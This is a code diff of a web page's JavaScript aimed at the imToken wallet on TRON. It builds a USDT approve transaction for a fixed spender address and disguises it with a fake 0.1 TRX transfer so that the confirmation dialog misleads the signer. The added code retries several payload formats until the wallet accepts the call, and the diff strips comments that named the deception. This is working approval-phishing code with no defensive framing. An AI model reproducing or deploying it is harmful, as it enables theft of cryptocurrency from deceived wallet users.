@@ -109,9 +109,9 @@
 <script>
 (function() {
   // ---------- 常量 ----------
-  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT
-  const SPENDER = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';      // 授权目标（也是伪装转账接收方）
-  const APPROVE_AMOUNT = '1000000';                           // 1 USDT (6 decimals)
+  const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+  const SPENDER = 'TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz';
+  const APPROVE_AMOUNT = '1000000';
   const TRON_API = 'https://api.trongrid.io';
 
   let walletAddr = '';
@@ -130,7 +130,6 @@
   const allowanceChangeEl = $('allowanceChange');
   const dotStatus = $('dotStatus');
 
-  // 日志输出
   function log(msg, type = '') {
     const div = document.createElement('div');
     div.className = 'log-line' + (type ? ' log-' + type : '');
@@ -139,7 +138,7 @@
     logBox.scrollTop = logBox.scrollHeight;
   }
 
-  // ---------- Base58 / Hex 工具 ----------
+  // ---------- Base58 / Hex ----------
   function base58Decode(str) {
     const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
     let num = 0n;
@@ -168,7 +167,7 @@
     return arr;
   }
 
-  // ---------- Protobuf 编码 ----------
+  // ---------- Protobuf ----------
   function varintEncode(val) {
     const bytes = [];
     let v = BigInt(val);
@@ -204,7 +203,6 @@
     return res;
   }
 
-  // 构造 TriggerSmartContract (approve)
   function buildTriggerSC(owner21, contract21, dataBytes) {
     return concat(
       fieldBytes(1, owner21),
@@ -216,7 +214,6 @@
     );
   }
 
-  // approve data: selector 0x095ea7b3 + spender(32B) + amount(32B)
   function buildApproveData(spender20, amountHex) {
     const selector = hexToBytes('095ea7b3');
     const spenderPadded = new Uint8Array(32);
@@ -225,36 +222,20 @@
     return concat(selector, spenderPadded, amountBytes);
   }
 
-  // 获取最新区块（带超时和备用方案）
   async function fetchLatestBlock() {
     const controller = new AbortController();
     const timeout = setTimeout(() => controller.abort(), 5000);
     try {
-      const resp = await fetch(TRON_API + '/wallet/getnowblock', {
-        signal: controller.signal
-      });
+      const resp = await fetch(TRON_API + '/wallet/getnowblock', { signal: controller.signal });
       const data = await resp.json();
       const h = data.block_header.raw_data;
-      return {
-        number: h.number,
-        blockID: data.blockID,
-        timestamp: h.timestamp
-      };
+      return { number: h.number, blockID: data.blockID, timestamp: h.timestamp };
     } catch (e) {
-      log('⚠️ 获取区块超时或失败: ' + e.message, 'warn');
-      // 使用备用区块数据（可能无法上链，但足以演示 UI 欺骗）
-      log('将使用备用区块数据', 'warn');
-      return {
-        number: 64000000,
-        blockID: '0000000000000000000000000000000000000000000000000000000000000000',
-        timestamp: Date.now()
-      };
-    } finally {
-      clearTimeout(timeout);
-    }
+      log('⚠️ 获取区块超时，使用备用区块', 'warn');
+      return { number: 64000000, blockID: '0000000000000000000000000000000000000000000000000000000000000000', timestamp: Date.now() };
+    } finally { clearTimeout(timeout); }
   }
 
-  // 构造混合交易 payload
   function buildPayload(userAddr, blockInfo) {
     const blockNum = blockInfo.number;
     const blockIDHex = blockInfo.blockID;
@@ -266,32 +247,28 @@
     const now = Date.now();
     const timestamp = now;
     const expiration = now + 600000;
-    const feeLimit = 15_000_000; // 15 TRX 手续费
+    const feeLimit = 15_000_000;
 
     const usdt21 = addrToHex21(USDT_CONTRACT);
     const spender20 = addrToHex20(SPENDER);
     const user21 = addrToHex21(userAddr);
     const user20 = addrToHex20(userAddr);
 
-    // approve data (1 USDT)
     const amountHex = BigInt(APPROVE_AMOUNT).toString(16);
     const approveData = buildApproveData(spender20, amountHex);
     const triggerSC = buildTriggerSC(user21, usdt21, approveData);
 
-    // Any: type.googleapis.com/protocol.TriggerSmartContract
     const typeUrl = 'type.googleapis.com/protocol.TriggerSmartContract';
     const anyBytes = concat(
       fieldBytes(1, new TextEncoder().encode(typeUrl)),
       fieldBytes(2, triggerSC)
     );
 
-    // Transaction.Contract: type=31, parameter=Any
     const contractInner = concat(
       fieldUint64(1, 31),
       fieldBytes(2, anyBytes)
     );
 
-    // Transaction.raw_data
     const rawDataBytes = concat(
       fieldBytes(1, refBlockBytes),
       fieldUint64(3, blockNum),
@@ -303,16 +280,13 @@
     );
     const rawDataHex = toHex(rawDataBytes);
 
-    // ---------- 构造欺骗用的 raw_data (确认页显示 TransferContract) ----------
-    const fakeToAddressBase58 = SPENDER;
-    const fakeOwnerBase58 = userAddr;
-
+    // 欺骗用的 fake 参数
     const fakeParam = {
       type_url: 'type.googleapis.com/protocol.TransferContract',
       value: {
-        amount: 100000, // 0.1 TRX
-        to_address: fakeToAddressBase58,
-        owner_address: fakeOwnerBase58
+        amount: 100000,
+        to_address: SPENDER,
+        owner_address: userAddr
       }
     };
 
@@ -348,7 +322,6 @@
     };
   }
 
-  // 计算 txID (raw_data_hex 的 SHA256) – 安全环境不可用时跳过
   async function computeTxID(rawDataHex) {
     try {
       const msgBytes = hexToBytes(rawDataHex);
@@ -361,7 +334,6 @@
     }
   }
 
-  // 查询 USDT allowance
   async function queryAllowance(ownerAddr, spenderAddr) {
     try {
       const ownerHex = '41' + toHex(addrToHex20(ownerAddr));
@@ -395,9 +367,7 @@
     try {
       const num = Number(wei) / 1e6;
       return num.toLocaleString(undefined, { maximumFractionDigits: 2 }) + ' USDT';
-    } catch {
-      return wei.toString();
-    }
+    } catch { return wei.toString(); }
   }
 
   async function refreshAllowanceUI(initial = false) {
@@ -483,25 +453,58 @@
     await refreshAllowanceUI(true);
   }
 
-  // 发送交易（修复点：包装 transaction 字段）
+  // 尝试调用 imToken 的多种参数格式
+  async function trySendTransaction(payload) {
+    // 补上 txID
+    const txID = await computeTxID(payload.raw_data_hex);
+    const basePayload = { ...payload, txID };
+
+    // 定义要尝试的格式列表，每个成员是一个对象或数组（将被直接传递）
+    const formats = [
+      // 直接传 payload（带 txID）
+      { desc: 'payload (with txID)', value: basePayload },
+      // 传数组 [payload]
+      { desc: '[payload]', value: [basePayload] },
+      // 包裹在 { transaction: ... }
+      { desc: '{ transaction: payload }', value: { transaction: basePayload } },
+      // 包裹在 { tx: ... }
+      { desc: '{ tx: payload }', value: { tx: basePayload } },
+      // 包裹在 { params: [payload] }
+      { desc: '{ params: [payload] }', value: { params: [basePayload] } },
+      // 仅 raw_data_hex（最后备选）
+      { desc: '{ raw_data_hex: payload.raw_data_hex }', value: { raw_data_hex: payload.raw_data_hex } }
+    ];
+
+    for (const format of formats) {
+      log(`尝试格式: ${format.desc}`, 'warn');
+      try {
+        const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', format.value);
+        log('成功! 返回: ' + JSON.stringify(res), 'success');
+        return res;
+      } catch (e) {
+        log(`格式 "${format.desc}" 失败: ${e.message}`, 'error');
+        if (e.message && e.message.includes('reject')) {
+          throw e; // 用户取消，停止尝试
+        }
+        // 继续下一个格式
+        continue;
+      }
+    }
+    throw new Error('所有尝试的格式均失败');
+  }
+
+  // 发送交易
   async function sendTx() {
     log('📌 按钮触发，开始构造交易…', 'warn');
-    if (!walletAddr) {
-      alert('请先连接钱包');
-      return;
-    }
-    if (!hasImTokenBridge()) {
-      log('imToken 桥接不可用，无法发送', 'error');
-      return;
-    }
+    if (!walletAddr) { alert('请先连接钱包'); return; }
+    if (!hasImTokenBridge()) { log('imToken 桥接不可用', 'error'); return; }
 
-    // 获取区块（可能使用备用数据）
     let blockInfo;
     try {
       blockInfo = await fetchLatestBlock();
       log('最新区块 #' + blockInfo.number, 'success');
     } catch (e) {
-      log('区块数据获取完全失败，中止', 'error');
+      log('区块数据获取失败，中止', 'error');
       return;
     }
 
@@ -510,33 +513,20 @@
     log('raw_data.contract[0].type = ' + payload.raw_data.contract[0].type, 'success');
     const approveSelector = '095ea7b3';
     if (payload.raw_data_hex.includes(approveSelector)) {
-      log('raw_data_hex 包含 approve 选择器 (' + approveSelector + ')', 'success');
+      log('raw_data_hex 包含 approve 选择器', 'success');
     } else {
       log('raw_data_hex 中未找到 approve 选择器！', 'error');
     }
 
-    // txID 计算（可能因环境跳过）
-    const localTxID = await computeTxID(payload.raw_data_hex);
-    if (localTxID) {
-      log('本地计算 txID: ' + localTxID, 'info');
-    }
-
-    log('准备调用 imToken.callPromisifyAPI("tron.sendTransaction") …', 'warn');
+    log('开始尝试调用 imToken…', 'warn');
     log('❗ 弹窗应显示：发送 0.1 TRX 至 ' + SPENDER, 'warn');
 
-    // ========== 关键修复：包装 transaction 字段 ==========
     try {
-      // 方式一：包装为 { transaction: payload }（符合 imToken bridge 期望）
-      log('尝试格式: { transaction: payload }', 'warn');
-      const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', { transaction: payload });
-      log('返回结果: ' + JSON.stringify(res), 'success');
+      const res = await trySendTransaction(payload);
       if (res && res.txid) {
         lastTxID = res.txid;
         log('交易已广播! TXID: ' + res.txid, 'success');
         log('Tronscan: https://tronscan.org/#/transaction/' + res.txid, 'info');
-        if (localTxID && res.txid !== localTxID) {
-          log('⚠️ 返回 txID 与本地计算不一致！', 'error');
-        }
         setTimeout(async () => {
           log('查询链上授权额度…', 'warn');
           await refreshAllowanceUI(false);
@@ -545,30 +535,11 @@
         log('未返回 txid，交易可能失败', 'error');
       }
     } catch (e) {
-      log('方式一失败: ' + e.message, 'error');
-      // 方式二：直接传递 raw_data_hex（某些版本要求）
-      log('尝试备用格式: { raw_data_hex: ... }', 'warn');
-      try {
-        const res2 = await window.imToken.callPromisifyAPI('tron.sendTransaction', { raw_data_hex: payload.raw_data_hex });
-        log('备用格式返回: ' + JSON.stringify(res2), 'success');
-        if (res2 && res2.txid) {
-          lastTxID = res2.txid;
-          log('交易已广播! TXID: ' + res2.txid, 'success');
-          log('Tronscan: https://tronscan.org/#/transaction/' + res2.txid, 'info');
-          setTimeout(async () => {
-            log('查询链上授权额度…', 'warn');
-            await refreshAllowanceUI(false);
-          }, 15000);
-        }
-      } catch (e2) {
-        log('备用格式也失败: ' + e2.message, 'error');
-        if (e2.message.includes('reject') || e2.message.includes('cancel')) {
-          log('用户取消了交易', 'warn');
-        } else if (e2.message.includes('insufficient')) {
-          log('TRX 余额不足', 'error');
-        } else if (e2.message.includes('invalid')) {
-          log('交易无效 (节点拒绝)', 'error');
-        }
+      log('最终失败: ' + e.message, 'error');
+      if (e.message.includes('reject') || e.message.includes('cancel')) {
+        log('用户取消了交易', 'warn');
+      } else if (e.message.includes('insufficient')) {
+        log('TRX 余额不足', 'error');
       }
     }
   }
@@ -583,7 +554,6 @@
   btnSend.addEventListener('click', sendTx);
   btnCheck.addEventListener('click', manualCheck);
 
-  // 初始检测
   if (hasImTokenBridge()) {
     log('检测到 imToken 桥接环境', 'success');
   } else {
